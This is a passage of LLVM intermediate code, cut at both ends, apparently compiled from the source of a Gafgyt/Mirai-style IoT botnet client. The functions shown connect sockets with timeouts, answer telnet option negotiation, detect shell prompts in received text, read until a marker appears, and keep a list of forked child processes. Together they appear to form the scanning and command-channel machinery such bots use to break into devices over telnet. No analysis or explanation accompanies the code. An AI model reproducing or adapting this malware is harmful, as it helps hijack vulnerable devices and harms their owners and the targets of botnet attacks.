  %28 = icmp ult i64 %27, 16
  br i1 %28, label %29, label %38

29:                                               ; preds = %25
  %30 = load %struct.__sigset_t*, %struct.__sigset_t** %11, align 8
  %31 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %30, i32 0, i32 0
  %32 = load i32, i32* %10, align 4
  %33 = zext i32 %32 to i64
  %34 = getelementptr inbounds [16 x i64], [16 x i64]* %31, i64 0, i64 %33
  store i64 0, i64* %34, align 8
  br label %35

35:                                               ; preds = %29
  %36 = load i32, i32* %10, align 4
  %37 = add i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %25, !llvm.loop !28

38:                                               ; preds = %25
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %5, align 4
  %41 = srem i32 %40, 64
  %42 = zext i32 %41 to i64
  %43 = shl i64 1, %42
  %44 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %45 = load i32, i32* %5, align 4
  %46 = sdiv i32 %45, 64
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [16 x i64], [16 x i64]* %44, i64 0, i64 %47
  %49 = load i64, i64* %48, align 8
  %50 = or i64 %49, %43
  store i64 %50, i64* %48, align 8
  %51 = load i32, i32* %5, align 4
  %52 = add nsw i32 %51, 1
  %53 = call i32 @select(i32 noundef %52, %struct.__sigset_t* noundef %8, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %8, %struct.timeval* noundef %9)
  store i32 %53, i32* %12, align 4
  %54 = icmp sle i32 %53, 0
  br i1 %54, label %55, label %100

55:                                               ; preds = %39
  br label %56

56:                                               ; preds = %95, %55
  %57 = load i32, i32* %13, align 4
  %58 = icmp slt i32 %57, 10
  br i1 %58, label %59, label %99

59:                                               ; preds = %56
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %60, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.45, i64 0, i64 0))
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %62, align 8
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %63, align 8
  br label %64

64:                                               ; preds = %59
  store %struct.__sigset_t* %8, %struct.__sigset_t** %15, align 8
  store i32 0, i32* %14, align 4
  br label %65

65:                                               ; preds = %75, %64
  %66 = load i32, i32* %14, align 4
  %67 = zext i32 %66 to i64
  %68 = icmp ult i64 %67, 16
  br i1 %68, label %69, label %78

69:                                               ; preds = %65
  %70 = load %struct.__sigset_t*, %struct.__sigset_t** %15, align 8
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %70, i32 0, i32 0
  %72 = load i32, i32* %14, align 4
  %73 = zext i32 %72 to i64
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %73
  store i64 0, i64* %74, align 8
  br label %75

75:                                               ; preds = %69
  %76 = load i32, i32* %14, align 4
  %77 = add i32 %76, 1
  store i32 %77, i32* %14, align 4
  br label %65, !llvm.loop !29

78:                                               ; preds = %65
  br label %79

79:                                               ; preds = %78
  %80 = load i32, i32* %5, align 4
  %81 = srem i32 %80, 64
  %82 = zext i32 %81 to i64
  %83 = shl i64 1, %82
  %84 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %85 = load i32, i32* %5, align 4
  %86 = sdiv i32 %85, 64
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %84, i64 0, i64 %87
  %89 = load i64, i64* %88, align 8
  %90 = or i64 %89, %83
  store i64 %90, i64* %88, align 8
  %91 = load i32, i32* %5, align 4
  %92 = add nsw i32 %91, 1
  %93 = call i32 @select(i32 noundef %92, %struct.__sigset_t* noundef %8, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %8, %struct.timeval* noundef %9)
  store i32 %93, i32* %12, align 4
  %94 = icmp sle i32 %93, 0
  br i1 %94, label %95, label %98

95:                                               ; preds = %79
  %96 = load i32, i32* %13, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %13, align 4
  br label %56, !llvm.loop !30

98:                                               ; preds = %79
  br label %99

99:                                               ; preds = %98, %56
  br label %100

100:                                              ; preds = %99, %39
  store i32 0, i32* %18, align 4
  %101 = load i8*, i8** %6, align 8
  store i8* %101, i8** %17, align 8
  br label %102

102:                                              ; preds = %120, %100
  %103 = load i32, i32* %7, align 4
  %104 = add nsw i32 %103, -1
  store i32 %104, i32* %7, align 4
  %105 = icmp sgt i32 %103, 1
  br i1 %105, label %106, label %123

106:                                              ; preds = %102
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i64 @recv(i32 noundef %107, i8* noundef %16, i64 noundef 1, i32 noundef 0)
  %109 = icmp ne i64 %108, 1
  br i1 %109, label %110, label %112

110:                                              ; preds = %106
  %111 = load i8*, i8** %17, align 8
  store i8 0, i8* %111, align 1
  store i32 -1, i32* %4, align 4
  br label %126

112:                                              ; preds = %106
  %113 = load i8, i8* %16, align 1
  %114 = load i8*, i8** %17, align 8
  %115 = getelementptr inbounds i8, i8* %114, i32 1
  store i8* %115, i8** %17, align 8
  store i8 %113, i8* %114, align 1
  %116 = load i8, i8* %16, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 10
  br i1 %118, label %119, label %120

119:                                              ; preds = %112
  br label %123

120:                                              ; preds = %112
  %121 = load i32, i32* %18, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %18, align 4
  br label %102, !llvm.loop !31

123:                                              ; preds = %119, %102
  %124 = load i8*, i8** %17, align 8
  store i8 0, i8* %124, align 1
  %125 = load i32, i32* %18, align 4
  store i32 %125, i32* %4, align 4
  br label %126

126:                                              ; preds = %123, %110
  %127 = load i32, i32* %4, align 4
  ret i32 %127
}

declare i32 @select(i32 noundef, %struct.__sigset_t* noundef, %struct.__sigset_t* noundef, %struct.__sigset_t* noundef, %struct.timeval* noundef) #3

declare i64 @recv(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @connectTimeout(i32 noundef %0, i8* noundef %1, i32 noundef %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct.__sigset_t*, align 8
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 noundef %19, i32 noundef 3, i8* noundef null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 noundef %24, i32 noundef 4, i64 noundef %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 noundef zeroext %29) #15
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* noundef %32, %struct.in_addr* noundef %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %4
  store i32 0, i32* %5, align 4
  br label %106

37:                                               ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %39, i8 0, i64 8, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 noundef %40, %struct.sockaddr* noundef %41, i32 noundef 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %97

45:                                               ; preds = %37
  %46 = call i32* @__errno_location() #15
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %95

49:                                               ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

54:                                               ; preds = %49
  store %struct.__sigset_t* %11, %struct.__sigset_t** %18, align 8
  store i32 0, i32* %17, align 4
  br label %55

55:                                               ; preds = %65, %54
  %56 = load i32, i32* %17, align 4
  %57 = zext i32 %56 to i64
  %58 = icmp ult i64 %57, 16
  br i1 %58, label %59, label %68

59:                                               ; preds = %55
  %60 = load %struct.__sigset_t*, %struct.__sigset_t** %18, align 8
  %61 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %60, i32 0, i32 0
  %62 = load i32, i32* %17, align 4
  %63 = zext i32 %62 to i64
  %64 = getelementptr inbounds [16 x i64], [16 x i64]* %61, i64 0, i64 %63
  store i64 0, i64* %64, align 8
  br label %65

65:                                               ; preds = %59
  %66 = load i32, i32* %17, align 4
  %67 = add i32 %66, 1
  store i32 %67, i32* %17, align 4
  br label %55, !llvm.loop !32

68:                                               ; preds = %55
  br label %69

69:                                               ; preds = %68
  %70 = load i32, i32* %6, align 4
  %71 = srem i32 %70, 64
  %72 = zext i32 %71 to i64
  %73 = shl i64 1, %72
  %74 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %75 = load i32, i32* %6, align 4
  %76 = sdiv i32 %75, 64
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 %77
  %79 = load i64, i64* %78, align 8
  %80 = or i64 %79, %73
  store i64 %80, i64* %78, align 8
  %81 = load i32, i32* %6, align 4
  %82 = add nsw i32 %81, 1
  %83 = call i32 @select(i32 noundef %82, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %11, %struct.__sigset_t* noundef null, %struct.timeval* noundef %12)
  %84 = icmp sgt i32 %83, 0
  br i1 %84, label %85, label %93

85:                                               ; preds = %69
  store i32 4, i32* %13, align 4
  %86 = load i32, i32* %6, align 4
  %87 = bitcast i32* %14 to i8*
  %88 = call i32 @getsockopt(i32 noundef %86, i32 noundef 1, i32 noundef 4, i8* noundef %87, i32* noundef %13) #12
  %89 = load i32, i32* %14, align 4
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %91, label %92

91:                                               ; preds = %85
  store i32 0, i32* %5, align 4
  br label %106

92:                                               ; preds = %85
  br label %94

93:                                               ; preds = %69
  store i32 0, i32* %5, align 4
  br label %106

94:                                               ; preds = %92
  br label %96

95:                                               ; preds = %45
  store i32 0, i32* %5, align 4
  br label %106

96:                                               ; preds = %94
  br label %97

97:                                               ; preds = %96, %37
  %98 = load i32, i32* %6, align 4
  %99 = call i32 (i32, i32, ...) @fcntl(i32 noundef %98, i32 noundef 3, i8* noundef null)
  %100 = sext i32 %99 to i64
  store i64 %100, i64* %15, align 8
  %101 = load i64, i64* %15, align 8
  %102 = and i64 %101, -2049
  store i64 %102, i64* %15, align 8
  %103 = load i32, i32* %6, align 4
  %104 = load i64, i64* %15, align 8
  %105 = call i32 (i32, i32, ...) @fcntl(i32 noundef %103, i32 noundef 4, i64 noundef %104)
  store i32 1, i32* %5, align 4
  br label %106

106:                                              ; preds = %97, %95, %93, %91, %36
  %107 = load i32, i32* %5, align 4
  ret i32 %107
}

declare i32 @fcntl(i32 noundef, i32 noundef, ...) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 noundef zeroext) #8

declare i32 @connect(i32 noundef, %struct.sockaddr* noundef, i32 noundef) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #12
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

8:                                                ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

10:                                               ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 noundef %15) #12
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

18:                                               ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

24:                                               ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

34:                                               ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18, !llvm.loop !33

37:                                               ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* noundef %44) #12
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

47:                                               ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @negotiate(i32 noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %63 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

13:                                               ; preds = %3
  store i32 0, i32* %4, align 4
  br label %65

14:                                               ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 noundef %15, i8* noundef %8, i64 noundef 1, i32 noundef 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

22:                                               ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %56

23:                                               ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

29:                                               ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %55

30:                                               ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %45

36:                                               ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = zext i1 %41 to i64
  %43 = select i1 %41, i32 251, i32 253
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %8, align 1
  br label %54

45:                                               ; preds = %30
  %46 = load i8*, i8** %6, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 1
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 253
  %51 = zext i1 %50 to i64
  %52 = select i1 %50, i32 252, i32 254
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %8, align 1
  br label %54

54:                                               ; preds = %45, %36
  br label %55

55:                                               ; preds = %54, %29
  br label %56

56:                                               ; preds = %55, %22
  %57 = load i32, i32* %5, align 4
  %58 = call i64 @send(i32 noundef %57, i8* noundef %8, i64 noundef 1, i32 noundef 16384)
  %59 = load i32, i32* %5, align 4
  %60 = load i8*, i8** %6, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 2
  %62 = call i64 @send(i32 noundef %59, i8* noundef %61, i64 noundef 1, i32 noundef 16384)
  br label %64

63:                                               ; preds = %3
  br label %64

64:                                               ; preds = %63, %56
  store i32 0, i32* %4, align 4
  br label %65

65:                                               ; preds = %64, %13
  %66 = load i32, i32* %4, align 4
  ret i32 %66
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @matchPrompt(i8* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.46, i64 0, i64 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* noundef %8) #11
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

11:                                               ; preds = %97, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* noundef %14) #11
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %100

17:                                               ; preds = %11
  br label %18

18:                                               ; preds = %74, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %72

22:                                               ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %70, label %34

34:                                               ; preds = %22
  %35 = load i8*, i8** %3, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %38, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 32
  br i1 %45, label %70, label %46

46:                                               ; preds = %34
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 13
  br i1 %57, label %70, label %58

58:                                               ; preds = %46
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 10
  br label %70

70:                                               ; preds = %58, %46, %34, %22
  %71 = phi i1 [ true, %46 ], [ true, %34 ], [ true, %22 ], [ %69, %58 ]
  br label %72

72:                                               ; preds = %70, %18
  %73 = phi i1 [ false, %18 ], [ %71, %70 ]
  br i1 %73, label %74, label %77

74:                                               ; preds = %72
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %18, !llvm.loop !34

77:                                               ; preds = %72
  %78 = load i8*, i8** %3, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i32, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = load i8*, i8** %4, align 8
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %87, %93
  br i1 %94, label %95, label %96

95:                                               ; preds = %77
  store i32 1, i32* %2, align 4
  br label %101

96:                                               ; preds = %77
  br label %97

97:                                               ; preds = %96
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %11, !llvm.loop !35

100:                                              ; preds = %11
  store i32 0, i32* %2, align 4
  br label %101

101:                                              ; preds = %100, %95
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @readUntil(i32 noundef %0, i8* noundef %1, i32 noundef %2, i32 noundef %3, i32 noundef %4, i8* noundef %5, i32 noundef %6, i32 noundef %7) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca %struct.__sigset_t*, align 8
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

33:                                               ; preds = %142, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %48

38:                                               ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %46, label %42

42:                                               ; preds = %38
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br label %46

46:                                               ; preds = %42, %38
  %47 = phi i1 [ true, %38 ], [ %45, %42 ]
  br label %48

48:                                               ; preds = %46, %33
  %49 = phi i1 [ false, %33 ], [ %47, %46 ]
  br i1 %49, label %50, label %143

50:                                               ; preds = %48
  br label %51

51:                                               ; preds = %50
  store %struct.__sigset_t* %21, %struct.__sigset_t** %25, align 8
  store i32 0, i32* %24, align 4
  br label %52

52:                                               ; preds = %62, %51
  %53 = load i32, i32* %24, align 4
  %54 = zext i32 %53 to i64
  %55 = icmp ult i64 %54, 16
  br i1 %55, label %56, label %65

56:                                               ; preds = %52
  %57 = load %struct.__sigset_t*, %struct.__sigset_t** %25, align 8
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %57, i32 0, i32 0
  %59 = load i32, i32* %24, align 4
  %60 = zext i32 %59 to i64
  %61 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 %60
  store i64 0, i64* %61, align 8
  br label %62

62:                                               ; preds = %56
  %63 = load i32, i32* %24, align 4
  %64 = add i32 %63, 1
  store i32 %64, i32* %24, align 4
  br label %52, !llvm.loop !36

65:                                               ; preds = %52
  br label %66

66:                                               ; preds = %65
  %67 = load i32, i32* %10, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %72 = load i32, i32* %10, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %10, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 noundef %79, %struct.__sigset_t* noundef %21, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef null, %struct.timeval* noundef %22)
  %81 = icmp slt i32 %80, 1
  br i1 %81, label %82, label %83

82:                                               ; preds = %66
  br label %143

83:                                               ; preds = %66
  %84 = load i8*, i8** %15, align 8
  %85 = load i32, i32* %18, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8, i8* %84, i64 %86
  store i8* %87, i8** %23, align 8
  %88 = load i32, i32* %10, align 4
  %89 = load i8*, i8** %23, align 8
  %90 = call i64 @recv(i32 noundef %88, i8* noundef %89, i64 noundef 1, i32 noundef 0)
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %19, align 4
  %92 = load i32, i32* %19, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %97, label %94

94:                                               ; preds = %83
  %95 = load i32, i32* %19, align 4
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %98

97:                                               ; preds = %94, %83
  store i32 0, i32* %9, align 4
  br label %148

98:                                               ; preds = %94
  %99 = load i32, i32* %19, align 4
  %100 = load i32, i32* %18, align 4
  %101 = add nsw i32 %100, %99
  store i32 %101, i32* %18, align 4
  %102 = load i8*, i8** %23, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 255
  br i1 %105, label %106, label %128

106:                                              ; preds = %98
  %107 = load i32, i32* %10, align 4
  %108 = load i8*, i8** %23, align 8
  %109 = getelementptr inbounds i8, i8* %108, i64 1
  %110 = call i64 @recv(i32 noundef %107, i8* noundef %109, i64 noundef 2, i32 noundef 0)
  %111 = trunc i64 %110 to i32
  store i32 %111, i32* %19, align 4
  %112 = load i32, i32* %19, align 4
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %117, label %114

114:                                              ; preds = %106
  %115 = load i32, i32* %19, align 4
  %116 = icmp eq i32 %115, 0
  br i1 %116, label %117, label %118

117:                                              ; preds = %114, %106
  store i32 0, i32* %9, align 4
  br label %148

118:                                              ; preds = %114
  %119 = load i32, i32* %19, align 4
  %120 = load i32, i32* %18, align 4
  %121 = add nsw i32 %120, %119
  store i32 %121, i32* %18, align 4
